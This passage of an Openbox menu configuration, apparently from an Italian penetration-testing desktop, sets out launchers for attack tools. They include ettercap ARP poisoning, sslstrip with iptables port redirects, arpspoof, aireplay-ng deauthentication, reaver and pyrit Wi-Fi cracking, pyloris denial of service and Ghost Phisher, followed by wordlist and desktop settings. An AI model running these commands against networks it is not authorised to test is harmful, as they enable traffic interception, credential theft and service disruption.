						<item label=£+Urlsnarf Eth0£+><action name=£+Execute£+><execute>roxterm -e urlsnarf -i eth0</execute></action></item>
						<item label=£+Urlsnarf Eth1£+><action name=£+Execute£+><execute>roxterm -e urlsnarf -i eth1</execute></action></item>
						<item label=£+Urlsnarf Wlan0£+><action name=£+Execute£+><execute>roxterm -e urlsnarf -i wlan0</execute></action></item>
						<item label=£+Urlsnarf Mon0£+><action name=£+Execute£+><execute>roxterm -e urlsnarf -i mon0</execute></action></item>
					</menu>
				</menu>
				<menu id=£+root-menu-11-7-2-8£+ label=£+Webspy£+>
					<item label=£+Webspy£+><action name=£+Execute£+><execute>roxterm -e echo £+(proxychains) webspy -i [interface] [targetip]£+</execute></action></item>
					<item label=£+Webspy --help£+><action name=£+Execute£+><execute>roxterm -e webspy --help</execute></action></item>
				</menu>
			</menu>
			<menu id=£+root-menu-11-7-3£+ label=£+Ettercap£+>
				<item label=£+Ettercap-gtk£+><action name=£+Execute£+><execute>ettercap-gtk</execute></action></item>
				<menu id=£+root-menu-11-7-3-1£+ label=£+Sniffing-Logging£+>
					<item label=£+Ettercap Eth0£+><action name=£+Execute£+><execute>roxterm -e ettercap -i eth0 -Tq -l $home/LOG/logeth0 -M ARP /192.168.0.1/ // // -P autoadd</execute></action></item>
					<item label=£+Ettercap Eth1£+><action name=£+Execute£+><execute>roxterm -e ettercap -i eth1 -Tq -l $home/LOG/logeth1 -M ARP /192.168.0.1/ // // -P autoadd</execute></action></item>
					<item label=£+Ettercap Wlan0£+><action name=£+Execute£+><execute>roxterm -e ettercap -i wlan0 -Tq -l $home/LOG/logwlan0 -M ARP /192.168.0.1/ // // -P autoadd</execute></action></item>
					<item label=£+Ettercap Mon0£+><action name=£+Execute£+><execute>roxterm -e ettercap -i mon0 -Tq -l $home/LOG/logmon0 -M ARP /192.168.0.1/ // // -P autoadd</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-7-3-2£+ label=£+Ettercap Log£+>
					<item label=£+Eth0£+><action name=£+Execute£+><execute>roxterm -e etterlog $home/LOG/logeth0.eci</execute></action></item>
					<item label=£+Eth1£+><action name=£+Execute£+><execute>roxterm -e etterlog $home/LOG/logeth1.eci</execute></action></item>
					<item label=£+Wlan0£+><action name=£+Execute£+><execute>roxterm -e etterlog $home/LOG/logwlan0.eci</execute></action></item>
					<item label=£+Mon0£+><action name=£+Execute£+><execute>roxterm -e etterlog $home/LOG/logmon0.eci</execute></action></item>
				</menu>
			</menu>
			<menu id=£+root-menu-11-7-4£+ label=£+Ferret-Hamster£+>
				<item label=£+Airmon-ng Start Wlan0£+><action name=£+Execute£+><execute>roxterm -e airmon-ng start wlan0</execute></action></item>
				<item label=£+Airodump-ng dump£+><action name=£+Execute£+><execute>roxterm -e echo £+airodump-­ng --bssid [mac address access bersaglio] -c [channel] ­-w [nome file cap] [interfaccia]£+</execute></action></item>
				<item label=£+Airdecap-ng£+><action name=£+Execute£+><execute>roxterm -e echo £+airdecap-ng [file cap] -e ESSID -p WPA_PASSWORD£+</execute></action></item>
				<item label=£+Ferret£+><action name=£+Execute£+><execute>roxterm -e echo £+ferret -r [file dec cap]£+</execute></action></item>
				<item label=£+Hamster£+><action name=£+Execute£+><execute>roxterm -e hamster</execute></action></item>
				<item label=£+Hamster Web£+><action name=£+Execute£+><execute>midori -p http://hamster£+</execute></action></item>
			</menu>
			<item label=£+Ghost Phisher£+><action name=£+Exxecute£+><execute>python /pentest/Ghost-Phisher/ghost.py</execute></action></item>
			<menu id=£+root-menu-11-7-5£+ label=£+Sslstrip£+>
				<item label=£+Sslstrip£+><action name=£+Execute£+><execute>roxterm -e ssltrip -l 10000 -a -w $home/LOG/.sslstrip.log</execute></action></item>
				<item label=£+Arpspoof£+><action name=£+Execute£+><execute>roxterm -e echo £+arpspoof -i [interface] -t [targetip] [routerip]£+</execute></action></item>
				<item label=£+Sslstrip -h£+><action name=£+Execute£+><execute>roxterm -e sslstrip -h</execute></action></item>
				<menu id=£+root-menu-11-7-5-1£+ label=£+Prerouting£+>
					<item label=£+80 (http) --> 10000£+><action name=£+Execute£+><execute>roxterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</execute></action></item>
					<item label=£+443 (https) --> 10000£+><action name=£+Execute£+><execute>roxterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000</execute></action></item>
					<item label=£+20 (ssh) --> 10000£+><action name=£+Execute£+><execute>roxterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 20 -j REDIRECT --to-port 10000</execute></action></item>
					<item label=£+21 (ftp) --> 10000£+><action name=£+Execute£+><execute>roxterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 21 -j REDIRECT --to-port 10000</execute></action></item>
					<item label=£+22 (ftp) --> 10000£+><action name=£+Execute£+><execute>roxterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 22 -j REDIRECT --to-port 10000</execute></action></item>
					<item label=£+990 (ftp ssl)--> 10000£+><action name=£+Execute£+><execute>roxterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 990 -j REDIRECT --to-port 10000</execute></action></item>
				</menu>
				<item label=£+LOG£+><action name=£+Execute£+><execute>geany /pentest/LOG/.sslstrip.log</execute></action></item>
			</menu>
			<item label=£+Videosnarf£+><action name=£+Execute£+><execute>roxterm -e echo £+videosnarf -i input.pcap£+</execute></action></item>
			<item label=£+Wireshark£+><action name=£+Execute£+><execute>wireshark</execute></action></item>
		</menu>
		<menu id=£+root-menu-11-8£+ label=£+Web Scanners£+>
			<menu id=£+root-menu-11-8-1£+ label=£+Nikto£+>
				<item label=£+Nikto Update£+><action name=£+Execute£+><execute>roxterm -e proxychains perl /pentest/nikto/nikto.pl -update</execute></action></item>
				<item label=£+Nikto List Plugins£+><action name=£+Execute£+><execute>roxterm -e perl /pentest/nikto/nikto.pl -list-plugins£+</execute></action></item>
				<item label=£+Nikto Base Attack£+><action name=£+Execute£+><execute>roxterm -e echo £+proxychains perl /pentest/nikto/nikto.pl -host [target IP/Url] -p [ports, default 80]£+</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-8-2£+ label=£+Openvas£+>
				<item label=£+GSD£+><action name=£+Execute£+><execute>roxterm -e gsd</execute></action></item>
				<item label=£+Openvas Web Interface (Chrome-GSA)£+><action name=£+Execute£+><execute>midori -p https://localhost:8000/</execute></action></item>
				<menu id=£+root-menu-11-8-2-1£+ label=£+Openvas Scanner (9391)£+>
					<item label=£+Openvas Scanner Start£+><action name=£+Execute£+><execute>roxterm -e openvassd</execute></action></item>
					<item label=£+Openvas Scanner Stop£+><action name=£+Execute£+><execute>roxterm -e killall openvassd</execute></action></item>
					<item label=£+Openvas Scanner User Creation£+><action name=£+Execute£+><execute>roxterm -e openvas-adduser</execute></action></item>
					<item label=£+Openvas Scanner Sync£+><action name=£+Execute£+><execute>roxterm -e proxychains openvas-nvt-sync</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-8-2-2£+ label=£+Openvas Manager (9390)£+>
					<item label=£+Openvas Manager Start£+><action name=£+Execute£+><execute>roxterm -e openvasmd</execute></action></item>
					<item label=£+Openvas Manager Stop£+><action name=£+Execute£+><execute>roxterm -e killall openvasmd</execute></action></item>
					<item label=£+Database Reinitialisation [require openvassd]£+><action name=£+Execute£+><execute>roxterm -e openvasmd --rebuild</execute></action></item>
					<item label=£+Openvas Manager help£+><action name=£+Execute£+><execute>roxterm -e openvasmd --help</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-8-2-3£+ label=£+Openvas Administrator£+>
					<item label=£+Openvas Administrator Start£+><action name=£+Execute£+><execute>roxterm -e openvasad</execute></action></item>
					<item label=£+Openvas Administrator Stop£+><action name=£+Execute£+><execute>roxterm -e killall openvasad</execute></action></item>
					<item label=£+Openvas Administrator help£+><action name=£+Execute£+><execute>roxterm -e openvasad --help</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-8-2-4£+ label=£+Greenbone-Security-Assistant (8000)£+>
					<item label=£+GSA Start£+><action name=£+Execute£+><execute>roxterm -e gsad</execute></action></item>
					<item label=£+GSA Stop£+><action name=£+Execute£+><execute>roxterm -e killall gsad</execute></action></item>
					<item label=£+GSA Help£+><action name=£+Execute£+><execute>roxterm -e gsad --help</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-8-2-5£+ label=£+OpenVAS-CLI£+>
					<item label=£+OpenVas-CLI Start£+><action name=£+Execute£+><execute>roxterm -e omp</execute></action></item>
					<item label=£+OpenVas-CLI Help£+><action name=£+Execute£+><execute>roxterm -e omp --help</execute></action></item>
					<item label=£+Edit omp.config£+><action name=£+Execute£+><execute>geany omp.config</execute></action></item>
				</menu>
			</menu>
			<menu id=£+root-menu-11-8-3£+ label=£+Pyloris£+>
				<item label=£+Pyloris£+><action name=£+Execute£+><execute>roxterm -e echo £+proxychains python /pentest/pyloris/pyloris.py [sito web/IP]</execute></action></item>
				<item label=£+Pyloris Doc£+><action name=£+Execute£+><execute>geany /pentest/pyloris/doc/httploris.txt</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-8-4£+ label=£+W3af£+>
				<item label=£+W3af_Cli£+><action name=£+Execute£+><execute>roxterm -e echo proxychains python /pentest/w3af/w3af_console</execute></action></item>
				<item label=£+W3af_Cli Help£+><action name=£+Execute£+><execute>roxterm -e python /pentest/w3af/w3af_console --help</execute></action></item>
				<item label=£+W3af_GUI£+><action name=£+Execute£+><execute>roxterm -e proxychains python /pentest/w3af/w3af_gui</execute></action></item>
			</menu>
		</menu>
		<menu id=£+root-menu-11-9£+ label=£+Wireless£+>
			<menu id=£+root-menu-11-9-1£+ label=£+Aircrack-ng£+>
				<menu id=£+root-menu-11-9-1-1£+ label=£+Airbase-ng£+>
					<item label=£+Airbase-ng£+><action name=£+Execute£+><execute>roxterm -e echo £+airbase-ng -e [Essid] -c [Channel] -v (-w [Chiave Wep])  (-x [hidden]) [interface]£+</execute></action></item>
					<item label=£+Airbase-ng Help£+><action name=£+Execute£+><execute>roxterm -e airbase-ng --help</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-9-1-2£+ label=£+Airmon-ng£+>
					<item label=£+Airmon-ng Start Eth0£+><action name=£+Execute£+><execute>roxterm -e airmon-ng start eth0</execute></action></item>
					<item label=£+Airmon-ng Stop Eth0£+><action name=£+Execute£+><execute>roxterm -e airmon-ng stop eth0</execute></action></item>
					<item label=£+Airmon-ng Start Wlan0£+><action name=£+Execute£+><execute>roxterm -e airmon-ng start wlan0</execute></action></item>
					<item label=£+Airmon-ng Stop Wlan0£+><action name=£+Execute£+><execute>roxterm -e airmon-ng stop wlan0</execute></action></item>
					<item label=£+Airmon-ng -h£+><action name=£+Execute£+><execute>roxterm -e airmon-ng -h</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-9-1-3£+ label=£+Airodump-ng£+>
					<menu id=£+root-menu-11-9-1-3-1£+ label=£+Interfaces£+>
						<item label=£+Eth0£+><action name=£+Execute£+><execute>roxterm -e airodump-ng eth0 -o cap -w $home/Caps/Rete.cap</execute></action></item>
						<item label=£+Eth1£+><action name=£+Execute£+><execute>roxterm -e airodump-ng eth1 -o cap $home/Caps/Rete.cap</execute></action></item>
						<item label=£+Wlan0£+><action name=£+Execute£+><execute>roxterm -e airodump-ng wlan0 -o cap $home/Caps/Rete.cap</execute></action></item>
						<item label=£+Mon0£+><action name=£+Execute£+><execute>roxterm -e airodump-ng mon0 -o cap $home/Caps/Rete.cap</execute></action></item>
					</menu>
					<item label=£+Airodump-ng dump£+><action name=£+Execute£+><execute>roxterm -e echo £+airodump-­ng --bssid [mac address access bersaglio] -c [channel] ­-w [nome file cap] [interfaccia]£+</execute></action></item>
					<item label=£+Airodump-ng --help£+><action name=£+Execute£+><execute>roxterm -e airodump airodump-ng --help</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-9-1-4£+ label=£+Airplay-ng£+>
					<item label=£+Airplay-ng Falsa Autenticazione£+><action name=£+Execute£+><execute>roxterm -e echo £+aireplay­-ng ­0 -1 ­-a [mac address access bersaglio] -­h [your mac adress] [interfaccia]£+</execute></action></item>
					<item label=£+Airplay-ng Scansione Pacchetti ARP£+><action name=£+Execute£+><execute>roxterm -e echo £+aireplay­-ng -­3 ­-a [mac address access bersaglio] -­h [your mac adress] [interfaccia]£+</execute></action></item>
					<item label=£+Airplay-ng Creazione Pacchetti ARP£+><action name=£+Execute£+><execute>roxterm -e echo £+aireplay­-ng ­-4 ­-a [mac address access bersaglio] -­h [your mac adress] [interfaccia]£+</execute></action></item>
					<item label=£+PacketFoge Creazione File xor£+><action name=£+Execute£+><execute>roxterm -e echo £+packetforge-ng 0 ­-a [mac address access bersaglio] -­h [your mac adress] -k 255.255.255.255 -l 255.255.255.255 -y [file .xor] -w [nome file arp]£+</execute></action></item>
					<item label=£+Airplay-ng Inietamento Pacchetto ARP £+><action name=£+Execute£+><execute>roxterm -e echo £+aireplay­-ng ­-2 ­-r [pacchetto arp] mon0£+</execute></action></item>
					<item label=£+Airplay-ng Deutenticazione del Client£+><action name=£+Execute£+><execute>roxterm -e echo £+aireplay­-ng 0 -1 ­-a [mac address access point bersaglio] -­c [mac adress victim] mon0£+</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-9-1-5£+ label=£+Wesside-ng (Wep Passive Attack)£+>
					<item label=£+Wesside-ng help£+><action name=£+Execute£+><execute>roxterm -e wesside-ng -h</execute></action></item>
					<item label=£+Wesside-ng (Automatic Accesspoint Selection)£+><action name=£+Execute£+><execute>roxterm -e echo £+wesside-ng -i [inteface]£+</execute></action></item>
					<item label=£+Wesside-ng (Manual Accesspoint Selection)£+><action name=£+Execute£+><execute>roxterm -e echo £+wesside-ng -i [interface] -v [mac adress acces point]£+</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-9-1-6£+ label=£+Aircrack-ng£+>
					<item label=£+Aircrack-ng List Processor£+><action name=£+Execute£+><execute>roxterm -e aircrack-ng -u</execute></action></item>
					<item label=£+Aircrack-ng Benchmark£+><action name=£+Execute£+><execute>roxterm -e aircrack-ng -S</execute></action></item>
					<item label=£+Aircrack-ng£+><action name=£+Execute£+><execute>roxterm -e echo £+aircrack-ng -a [ 1 [wep] | 2 [wpa] ] -e [essid] -b [bssid] -p [n. treads] (-q [no output]) -l [keyfile] [-w [wordlist] | -r [airolib-ng database] ]£+</execute></action></item>
				</menu>
			</menu>
			<menu id=£+root-menu-11-9-2£+ label=£+Cowpatty£+>
				<item label=£+Cowpatty Attack£+><action name=£+Execute£+><execute>roxterm -e echo £+cowpatty -r [capture file .dump] -f [wordlist] -s [essid]£+</execute></action></item>
				<item label=£+Cowpatty Help£+><action name=£+Execute£+><execute>roxterm -e cowpatty --help</execute></action></item>
				<menu id=£+root-meu-10-9-2-1£+ label=£+Genpwk£+>
					<item label=£+Genpwk Help£+><action name=£+Execute£+><execute>roxterm -e genpwk --help</execute></action></item>
					<item label=£+Genpwk£+><action name=£+Execute£+><execute>roxterm -e echo £+genpmk -f [wordlist] -d [hash output] -s [essid]£+</execute></action></item>
					<item label=£+Cowpatty Hash Attack£+><action name=£+Execute£+><execute>roxterm -e echo £+cowpatty -r [capture file .dump] -d [hashfile] -s [essid]£+</execute></action></item>
				</menu>
			</menu>
			<item label=£+Fern Wifi Cracker Gui£+><action name=£+Execute£+><execute>python /pentest/Fern-Wifi-Cracker/execute.py</execute></action></item>
			<item label=£+Macchanger-gtk£+><action name=£+Execute£+><execute>macchanger-gtk</execute></action></item>
			<menu id=£+root-menu-11-9-3£+ label=£+Pyrit£+>
				<item label=£+Pyrit£+><action name=£+Execute£+><execute>roxterm -e pyrit</execute></action></item>
				<menu id=£+root-menu-11-10-9-3-1£+ label=£+List£+>
					<item label=£+Pyrit List_Cores£+><action name=£+Execute£+><execute>roxterm -e pyrit list_cores</execute></action></item>
					<item label=£+Pyrit List Essids£+><action name=£+Execute£+><execute>roxterm -e pyrit list_essids</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-10-9-3-2£+ label=£+Test£+>
					<item label=£+Pyrit Benchmark£+><action name=£+Execute£+><execute>roxterm -e pyrit benchmark</execute></action></item>
					<item label=£+Pyrit Benchmark Long£+><action name=£+Execute£+><execute>roxterm -e pyrit benchmark_long</execute></action></item>
					<item label=£+Pyrit Eval£+><action name=£+Execute£+><execute>roxterm -e pyrit eval</execute></action></item>
					<item label=£+Pyrit Check DB£+><action name=£+Execute£+><execute>roxterm -e pyrit check_db</execute></action></item>
					<item label=£+Pyrit SelfTest£+><action name=£+Execute£+><execute>roxterm -e pyrit selftest</execute></action></item>
					<item label=£+Pyrit Verify£+><action name=£+Execute£+><execute>roxterm -e pyrit verify</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-10-9-3-3£+ label=£+Analize Cap£+>
					<item label=£+Pyrit Analize Cap£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -r [percorso file .cap] analyze£+</execute></action></item>
					<item label=£+Pyrit Analize Strip£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -r [percorso file .cap] strip£+</execute></action></item>
					<item label=£+Pyrit Analize StripLive£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -r [percorso file .cap] striplive£+</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-10-9-3-4£+ label=£+Creazione Database£+>
					<item label=£+Pyrit Create_Essid£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -e [nome essid] create_essid£+</execute></action></item>
					<item label=£+Pyrit Delete_Essid£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -e [nome essid] delete_essid£+</execute></action></item>
					<item label=£+Pyrit Import_Passwords£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -i [percorso wordlist.txt] import_passwords£+</execute></action></item>
					<item label=£+Pyrit Batch£+><action name=£+Execute£+><execute></execute>roxterm -e pyrit batch</action></item>
				</menu>
				<menu id=£+root-menu-11-10-9-3-5£+ label=£+Export£+>
					<item label=£+Pyrit Export_Cowpatty£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -o [percorso file cowpatty] export_cowpatty£+</execute></action></item>
					<item label=£+Pyrit Export_Hashdb (airolib database)£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -o [percorso file airolib] export_hashdb£+s</execute></action></item>
					<item label=£+Pyrit Export_Passwords£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -o [percorso file passwords] export_passwords£+</execute></action></item>
				</menu>
				<menu id=£+root-menu-11-10-9-3-6£+ label=£+Attack£+>
					<item label=£+Pyrit Attack_Batch£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -e [nome essid] -i [percorso wordlist.txt] -r [percorso file .cap] attack_batch£+</execute></action></item>
					<item label=£+Pyrit Attack_DB£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -e [nome essid] -i [percorso wordlist.txt] -r [percorso file .cap] attack_db£+</execute></action></item>
					<item label=£+Pyrit Attack_Cowpatty£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -e [nome essid] -i [percorso wordlist.txt] -r [percorso file .cap] attack_cowpatty£+</execute></action></item>
					<item label=£+Pyrit Attack_Passthrough£+><action name=£+Execute£+><execute>roxterm -e echo £+pyrit -e [nome essid] -i [percorso wordlist.txt] -r [percorso file .cap] attack_passthrough£+</execute></action></item>
				</menu>
				<item label=£+Pyrit Serve£+><action name=£+Execute£+><execute>roxterm -e pyrit serve</execute></action></item>
				<item label=£+Geany Pyrit Config£+><action name=£+Execute£+><execute>geany $home/.pyrit/config</execute></action></item>
			</menu>
			<item label=£+Reaver-WPS£+><action name=£+Execute£+><execute>roxterm -e echo £+reaver -i monitorinterface -b apbssid [-c channel] [-e essid] -vv£+</execute></action></item>
			<menu id=£+root-menu-11-9-4£+ label=£+Wifite£+>
				<item label=£+Wifite Upgrade£+><action name=£+Execute£+><execute>roxterm -e proxychains python /pentest/wifite_r38.py -upgrade</execute></action></item>
				<item label=£+Wifite Help£+><action name=£+Execute£+><execute>roxterm -e python /pentest/wifite_r38.py --help</execute></action></item>
				<item label=£+Wifite Wep Attack£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/wifite_r38.py -i [interface] -e [essid] -c [channel] --anon -pps [max packet/sec] --force-fake --autocrack [min ivs] -wepw [min(max attack time)] --no-wpa -p [min db]£+</execute></action></item>
				<item label=£+Wifite Wpa Attack£+><action name=£+Execute£+><execute>roxterm -e echo £+python /pentest/wifite_r38.py -i [interface] -e [essid] -c [channel] --anon -d [wordlist] -wpaw [min(time for handshake)] --no-strip --pyrit [pyrit/cowpatty attack] --no-wep -p [min db]£+</execute></action></item>
			</menu>
		</menu>
		<menu id=£+root-menu-11-10£+ label=£+Wordlist£+>
			<menu id=£+root-menu-11-10-1£+ label=£+Convertitors£+>
				<item label=£+Word to Text£+><action name=£+Execute£+><execute>roxterm -e echo £+catdoc£+</execute></action></item>
				<item label=£+Exel to Text£+><action name=£+Execute£+><execute>roxterm -e echo £+xls2csv£+</execute></action></item>
				<item label=£+Powerpoint to Text£+><action name=£+Execute£+><execute>roxterm -e echo £+catppt£+</execute></action></item>
				<item label=£+Pdf to Textl£+><action name=£+Execute£+><execute>roxterm -e echo £+pdftotext£+</execute></action></item>
				<item label=£+Html to Text£+><action name=£+Execute£+><execute>roxterm -e echo £+html2text£+</execute></action></item>
				<item label=£+Musical Tag to Text£+><action name=£+Execute£+><execute>roxterm -e echo £+id3v2£+</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-10-2£+ label=£+Generators£+>
				<item label=£+Crunch£+><action name=£+Execute£+><execute>roxterm -e echo £+crunch [min] [max] [charset] [-q [file to permute] | -t [@@@kk (@ change k constant)] ] -o [file output]£+</execute></action></item>
				<item label=£+Wyd£+><action name=£+Execute£+><execute>roxterm -e echo £+perl /pentest/wyd-0.2/wyd.pl -n -o [file] [input]£+</execute></action></item>
				<item label=£+Cewl£+><action name=£+Execute£+><execute>roxterm -e echo £+ruby /pentest/cewl/cewl.rb --depth x -o [go offsite] --min_word_lenght [def 3] [--write [file output] | --no-words] --meta [file] --email [file]£+</execute></action></item>
				<item label=£+John Incremental£+><action name=£+Execute£+><execute>roxterm -e echo £+john --incremental=[charset] [ --stdout | --stodut=[maxlenght] ] >> [incrementalwordlist]£+</execute></action></item>
				<item label=£+Text to Wordlist£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [file.txt] | sed -e 's/[^a-zA-Z]/ /g' | tr '[:lower:]' '[:upper:]' | tr ' ' '\012' | sed -e '/^$/d' | sort -u >> [wordlist.txt]£+</execute></action></item>
				<item label=£+Joining Files£+><action name=£+Execute£+><execute>roxterm -e echo £+cat * | sed -e 's/[^a-zA-Z]/ /g' | tr -cd '\11\12\40-\176' | tr ' ' '\012' | tr '[:upper:]' '[:lower:]' | sed -e '/aaa/d' | sed -e '/bbb/d' | sed -e '/ccc/d' | sed -e '/ddd/d' | sed -e '/eee/d' | sed -e '/fff/d' | sed -e '/ggg/d' | sed -e '/hhh/d' | sed -e '/iii/d' | sed -e '/jjj/d' | sed -e '/kkk/d' | sed -e '/lll/d' | sed -e '/mmm/d' | sed -e '/nnn/d' | sed -e '/ooo/d' | sed -e '/ppp/d' | sed -e '/qqq/d' | sed -e '/rrr/d' | sed -e '/sss/d' | sed -e '/ttt/d' | sed -e '/uuu/d' | sed -e '/vvv/d' | sed -e '/www/d' | sed -e '/xxx/d' | sed -e '/yyy/d' | sed -e '/zzz/d' | sed -e '/aa/d' | sed -e '/ee/d' | sed -e '/ii/d' | sed -e '/oo/d' | sed -e '/uu/d' | sed -e '/jj/d' | sed -e '/kk/d' | sed -e '/ww/d' | sed -e '/xx/d' | sed -e '/yy/d' | sed -e '/^$/d' | sort -u >> [wordlist.txt]</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-10-3£+ label=£+Permutators£+>
				<item label=£+Leetify£+><action name=£+Execute£+><execute>roxterm -e echo £+perl /pentest/leetify.pl [wordlist] >> [file output] £+</execute></action></item>
				<item label=£+John Wordlist Permutation£+><action name=£+Execute£+><execute>roxterm -e echo £+john --rules [--wordlist=[wordlist] | --stdin] --stdout | sort -u >> [permwordlist]£+</execute></action></item>
			</menu>
			<menu id=£+root-menu-11-10-4£+ label=£+Editing£+>
				<item label=£+Sort£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [input.txt] | sort -u [ --dictionary-order | --general-numeric-sort | --human-numeric-sort ] -f [min to maius] [--reverse] -T [temp dir] >> [output.txt]£+</execute></action></item>
				<item label=£+Pw-inspector£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [input] | pw-inspector -m [Minimum Lenght] -M [Maximum Lenght] >> [output.txt]£+</execute></action></item>
				<item label=£+Delete parentesis and text included in them£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [parentesis.txt] | sed -e 's/(.*)//g'£+ >> [unparentesised.txt[ </execute></action></item>
				<item label=£+Delete the first word£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [input.txt] | sed -e 's/^ *[^ ]* //' >> [output.txt]£+</execute></action></item>
				<item label=£+Spaces to return£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [spaces.txt] | tr ' ' '\012' >> [return.txt]£+</execute></action></item>
				<item label=£+Delet endlines Spaces£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [file1.txt] | sed -e 's/ *$//' >> [file2.txt]£+</execute></action></item>
				<item label=£+Remove NonPrintable Characters£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [inputfile] | sed -e 's/[:print:]^//g' | sed -e 's/[:cntrl:]*//g' >> [outputfile]</execute></action></item>
				<item label=£+Remove NonAscii Chars£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [input.txt] | tr -cd '\11\12\40-\176' >> [output.txt]£+</execute></action></item>
				<item label=£+Capitalize First Letter£+><action name=£+Execute£+><execute>roxterm -e echo £+cat [wordlist.txt] | sed -r 's/\b(.)/\U\1/g' >> [Capitalised.txt]£+</execute></action></item>
				<item label=£+LowerAlpha To UpperAlpha£+><action name=£+Execute£+><execute>roxterm -e echo £+cat lower.txt | tr '[:lower:]' '[:upper:]' >> upper.txt</execute></action></item>
				<item label=£+UpperAlpha To LowerAlpha£+><action name=£+Execute£+><execute>roxterm -e echo £+cat lower.txt | tr '[:upper:]' '[:lower:]' >> upper.txt</execute></action></item>
            </menu>
			<item label=£+Wc -l£+><action name=£+Execute£+><execute>roxterm -e echo £+wc -l wordlist£+</execute></action></item>
			<item label=£+View First X Lines£+><action name=£+Execute£+><execute>roxterm -e echo £+head -n [n. lines] wordlist.txt£+</execute></action></item>
			<item label=£+View Last X Lines£+><action name=£+Execute£+><execute>roxterm -e echo £+tail -n [n. lines] wordlist.txt£+</execute></action></item>
		</menu>
	</menu>
	<separator/>
	<menu id=£+root-menu-12£+ label=£+Configure£+>
		<menu id=£+root-menu-12-1£+ label=£+OpenBox£+>
			<item label=£+Edit menu.xml£+><action name=£+Execute£+><execute>geany $home/.config/openbox/menu.xml	</execute></action></item>
			<item label=£+Edit autostart.sh£+><action name=£+Execute£+><execute>geany $home/.config/openbox/autostart.sh</execute></action></item>
			<item label=£+Edit rc.xml£+><action name=£+Execute£+><execute>geany $home/.config/openbox/rc.xml</execute></action></item>
			<separator/>
			<item label=£+ObConf£+><action name=£+Execute£+><execute>obconf</execute></action></item>
			<item label=£+ObMenu£+><action name=£+Execute£+><execute>obmenu</execute></action></item>
		</menu>
		<menu id=£+root-menu-12-3£+ label=£+Nitrogen£+>
			<item label=£+Default£+><action name=£+Execute£+><execute>nitrogen /usr/share/backgrounds</execute></action></item>
			<item label=£+Immagini 1920x1080£+><action name=£+Execute£+><execute>nitrogen $home/Immagini/Sfondi/1920x1080</execute></action></item>
			<item label=£+Immagini 1680x1050£+><action name=£+Execute£+><execute>nitrogen $home/Immagini/Sfondi/1680x1050</execute></action></item>
			<item label=£+Immagini 1024x700£+><action name=£+Execute£+><execute>nitrogen $home/Immagini/Sfondi/1024x700</execute></action></item>
			<item label=£+Immagini 800x600£+><action name=£+Execute£+><execute>nitrogen $home/Immagini/Sfondi/800x600</execute></action></item>
			<menu id=£+root-menu-12-3-1£+ label=£+Conf£+>
				<item label=£+Edit nitrogen.cfg£+><action name=£+Execute£+><execute>geany $home/.config/nitrogen/nitrogen.cfg</execute></action></item>
				<item label=£+Edit bg-saved.cfg£+><action name=£+Execute£+><execute>geany $home/.config/nitrogen/bg-saved.cfg</execute></action></item>
				<item label=£+Edit bg-saved.conf£+><action name=£+Execute£+><execute>geany $home/.config/nitrogen/bg-saved.conf</execute></action></item>
			</menu>
		</menu>
		<menu id=£+root-menu-12-4£+ label=£+Conky£+>
			<item label=£+Conky£+><action name=£+Execute£+><execute>conky -c $home/.config/conky/conkyrc</execute></action></item>
			<item label=£+Kill Conky£+><action name=£+Execute£+><execute>pkill conky</execute></action></item>
			<item label=£+ConkyGUI£+><action name=£+Execute£+><execute>java -jar /opt/conkygui/conkygui.jar</execute></action></item>
			<item label=£+Edit conkyrc£+><action name=£+Execute£+><execute>geany $home/.config/conky/conkyrc</execute></action></item>
		</menu>
		<menu id=£+root-menu-12-7£+ label=£+Tint2£+>
			<item label=£+Tint2£+><action name=£+Execute£+><execute>tint2</execute></action></item>
			<item label=£+Pkill Tint2£+><action name=£+Execute£+><execute>pkill tint2</execute></action></item>
			<item label=£+Edit tint2rc£+><action name=£+Execute£+><execute>geany $home/.config/tint2/tint2rc</execute></action></item>
		</menu>
		<menu id=£+root-menu-12-8£+ label=£+Awn£+>
			<item label=£+Awn£+><action name=£+Execure£+><execute>avant-window-navigator</execute></action></item>
